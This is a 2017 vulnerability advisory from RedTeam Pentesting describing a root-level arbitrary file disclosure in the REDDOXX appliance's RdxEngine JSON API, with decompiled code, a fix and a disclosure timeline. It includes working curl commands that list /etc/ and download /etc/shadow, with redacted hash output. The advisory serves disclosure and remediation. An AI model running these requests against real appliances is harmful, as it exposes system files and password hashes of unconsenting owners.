@@ -1,0 +1,261 @@
+Advisory: Arbitrary File Disclosure with root Privileges via RdxEngine-API in REDDOXX Appliance
+
+RedTeam Pentesting discovered an arbitrary file disclosure vulnerability
+in the REDDOXX appliance software, which allows unauthenticated
+attackers to list directory contents and download arbitrary files from
+the affected system with root permissions.
+
+Details
+=======
+
+Product: REDDOXX Appliance
+Affected Versions: Build 2032 / v2.0.625, older versions likely affected too
+Fixed Versions: Version 2032 SP2
+Vulnerability Type: Arbitrary File Disclosure
+Security Risk: high
+Vendor URL: https://www.reddoxx.com/
+Vendor Status: patch available
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-006
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+Introduction
+============
+
+"REDDOXX is a leading supplier of solutions for e-mail archiving,
+encrypted and digitally signed e-mail traffic as well as spam
+protection. Our focus is on technological innovation: taking our cue
+from our clientsâ?? requirements our competent and quality-conscious
+employees strive to offer you the best possible products at all times.
+Using stringent quality standards and proven processes we keep
+developing our company and products continuously, with the goal of
+continuous improvement."
+
+(from the vendor's homepage)
+
+More Details
+============
+
+When using the user frontend of the REDDOXX appliance [0] reachable via
+http://www.example.com/rws/user/, HTTP POST requests are used to perform
+certain actions. For example, the following request is used to save the
+settings of the current user's profile:
+
+------------------------------------------------------------------------
+
+POST /RdxEngine/json HTTP/1.1
+Host: www.example.com
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 210
+Connection: close
+
+{
+"method": "CoreService.SaveUserProfile",
+"params": {
+"Profile": {
+"UseHtmlMail": true,
+"DefaultArchiveDisplayPeriode": "5",
+"ReportLanguage": "en",
+"EnableQueueReport": true
+}
+},
+"id": "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
+}
+------------------------------------------------------------------------
+
+Through analysis of the .NET binaries pertaining to this endpoint,
+extracted from the appliance ISO offered on the vendor's homepage [1],
+the methods handling these requests were examined. For the
+"SaveUserProfile" method, which is specified through the POST parameter
+"method", the code is as follows:
+
+------------------------------------------------------------------------
+
+// Reddoxx.Api.Legacy.CoreServiceService
+public void SaveUserProfile(TRoUserProfile Profile)
+{
+try
+{
+this.client.OnStartRequest("CoreService", "SaveUserProfile");
+this.Service.SaveUserProfile(Profile);
+this.client.OnEndRequest("CoreService", "SaveUserProfile");
+}
+catch (System.Exception e)
+{
+this.client.HandleException("CoreService", "SaveUserProfile", e);
+}
+}
+------------------------------------------------------------------------
+
+The "TroUserProfile" class contains information about the parameters
+that are required for valid requests to this method:
+
+------------------------------------------------------------------------
+
+namespace Reddoxx.Api.Legacy
+{
+[...]
+public class TRoUserProfile : ComplexType
+{
+private string __ReportLanguage;
+
+private int __DefaultArchiveDisplayPeriode;
+
+private bool __EnableQueueReport;
+
+private bool __UseHtmlMail;
+
+[...]
+}
+}
+------------------------------------------------------------------------
+
+These variable names correspond to the POST parameters contained in the
+request that was created when the profile was saved. With this knowledge
+about how methods are called and parameters are passed, it was attempted
+to call other methods from different packages. It was determined that it
+is possible to access certain methods which allow reading arbitrary
+files and directory listings.
+
+It was later discovered that the process handling requests to the
+vulnerable methods runs with root privileges.
+
+Proof of Concept
+================
+
+At least two methods are found to be of interest for attackers:
+FileTransfer.GetDirectoryList, which returns a directory listing for a
+path specified via a parameter, and FileTransfer.DownloadFile, which
+returns the file specified via a parameter in Base64-encoded form. The
+following curl command-lines can be used to call the respective methods:
+
+------------------------------------------------------------------------
+
+$ curl --silent --data-binary '{"id":"{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}",''"method":"FileTransfer
+.GetDirectoryList","params":{"Directory": "/etc/"}}' 'http://www.example.com/RdxEngine/json' | jq '.result.FileInfoList[].FileName'
+"chatscripts"
+"gtk-2.0"
+"xen"
+"dbus-1"
+"request-key.d"
+"smartmontools"
+"console"
+"skel"
+"xml"
+"initramfs-tools"
+"sysctl.d"
+"pear"
+"sudoers.d"
+"cron.monthly"
+"rc5.d"
+"init"
+"byobu"
+"pki"
+"xpdf"
+"cron.weekly"
+"snmp"
+"ld.so.conf.d"
+[...]
+------------------------------------------------------------------------
+
+Since the process handling the requests runs with root privileges, it
+was also possible to read the contents of the file "/etc/passwd":
+
+------------------------------------------------------------------------
+
+$ curl --silent --data-binary '{"id":"{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}",''"method":"FileTransfer
+.DownloadFile","params":{"FileName": "/etc/shadow",''"Sequence": 1,"ChunkSize": 10000}}' 'http://www.example.com/RdxEngine/json' | jq -r .result.ChunkData | tr -d '\r\n' | base64 -d
+root:$6$XXXXXXXX$YYYYYYY[...]YYYYYYYY:14993:0:99999:7:::
+daemon:*:16652:0:99999:7:::
+bin:*:16652:0:99999:7:::
+sys:*:16652:0:99999:7:::
+sync:*:16652:0:99999:7:::
+games:*:16652:0:99999:7:::
+man:*:16652:0:99999:7:::
+lp:*:16652:0:99999:7:::
+mail:*:16652:0:99999:7:::
+news:*:16652:0:99999:7:::
+uucp:*:16652:0:99999:7:::
+proxy:*:16652:0:99999:7:::
+www-data:*:16652:0:99999:7:::
+backup:*:16652:0:99999:7:::
+list:*:16652:0:99999:7:::
+irc:*:16652:0:99999:7:::
+gnats:*:16652:0:99999:7:::
+nobody:*:16652:0:99999:7:::
+libuuid:!:16652:0:99999:7:::
+syslog:*:16652:0:99999:7:::
+messagebus:*:16899:0:99999:7:::
+sshd:*:16899:0:99999:7:::
+vboxadd:!:16899::::::
+statd:*:16899:0:99999:7:::
+admin:$1$XXXXXXXX$ZZZZZZZZZZZZZZZZZZZZZZ:14054:0:99999:7:::
+clamav:!:16899:0:99999:7:::
+ntp:*:16899:0:99999:7:::
+hacluster:!:16899:0:99999:7:::
+firebird:*:16899:0:99999:7:::
+redis:!:16899:0:99999:7:::
+snmp:*:16899:0:99999:7:::
+bind:*:16899:0:99999:7:::
+smbadmin:!:17037:0:99999:7:::
+smbuser:!:17037:0:99999:7:::
+------------------------------------------------------------------------
+
+Workaround
+==========
+
+None
+
+Fix
+===
+
+Update the appliance software to Version 2032 SP2.
+
+Security Risk
+=============
+
+Attackers with access to a REDDOXX appliance are able to retrieve
+directory listings and content of arbitrary files. Although this
+vulnerability requires attackers to submit a valid session ID, the
+vulnerabilities described in rt-sa-2017-004 [2] and rt-sa-2017-005 [3]
+show how this requirement can be fulfilled even by attackers without
+valid credentials. Additionally, the RdxEngine process handling the
+requests to the vulnerable methods runs with root privileges, allowing
+attackers to read any file on the filesystem and, for example, extract
+the local user hashes for offline brute-force attacks. This
+vulnerability is therefore rated as a high risk.
+
+Timeline
+========
+
+2017-05-17 Vulnerability identified
+2017-05-23 Customer approved disclosure of vulnerability
+2017-05-26 Customer provided details of vulnerability to vendor
+2017-07-20 Vulnerability reported as fixed by vendor
+2017-07-24 Advisory released
+
+References
+==========
+
+[0] https://www.reddoxx.com/en/
+[1] https://my.reddoxx.com/documents/manual/en/custdl/product-downloads
+(Requires login)
+[2] https://www.redteam-pentesting.de/advisories/rt-sa-2017-004
+[3] https://www.redteam-pentesting.de/advisories/rt-sa-2017-005
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
